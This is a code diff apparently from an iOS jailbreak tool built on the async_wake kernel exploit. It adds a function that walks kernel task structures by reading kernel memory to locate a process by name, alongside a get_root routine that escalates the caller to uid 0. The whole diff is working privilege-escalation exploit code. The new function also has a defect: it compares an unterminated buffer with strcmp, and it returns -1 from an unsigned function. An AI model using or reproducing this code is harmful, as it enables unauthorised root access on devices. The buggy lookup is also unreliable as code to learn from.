@@ -37,7 +37,7 @@ uint64_t get_process_pid(uint32_t pid) {
     uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     
     //loop through the task structures to find the task structure for the supplied pid
-    while (struct_task != 0 ) { //((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
+    while (struct_task != 0 ) {
         // from async_wake.c:440 - where Ian loops to find the kernel vm_map
         uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
         uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
@@ -48,6 +48,33 @@ uint64_t get_process_pid(uint32_t pid) {
         struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
     }
    
+    return -1;
+}
+
+uint64_t get_process_pid_from_name(char* procname){
+    
+    // task_self_addr points to the struct ipc_port for our task port
+    uint64_t task_self = task_self_addr();
+    // read the address of the task struct
+    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    
+    //loop through the task structures to find the task structure for the supplied pid
+    while (struct_task != 0 ) {
+        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
+        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        
+        // create a buffer to hold the process name
+        char buff [strlen(procname)];
+        // read the process name, we only read of strlen("target process")
+        rkbuffer(bsd_info+koffset(KSTRUCT_OFFSET_PROC_COMM),buff,(uint32_t)strlen(procname));
+        
+        //check if it is the pocess we are looking for
+        if (strcmp(procname, buff) == 0) {
+            return bsd_info;
+        }
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    }
+    
     return -1;
 }
 
@@ -100,6 +127,7 @@ uid_t get_root(){
     //set our uid to root :D
     setuid(0);
     printf("PID: %d, UID: %d\n",getpid(), getuid());
+       
     //return the olduid so we can reset it down the line
     return olduid;
 }
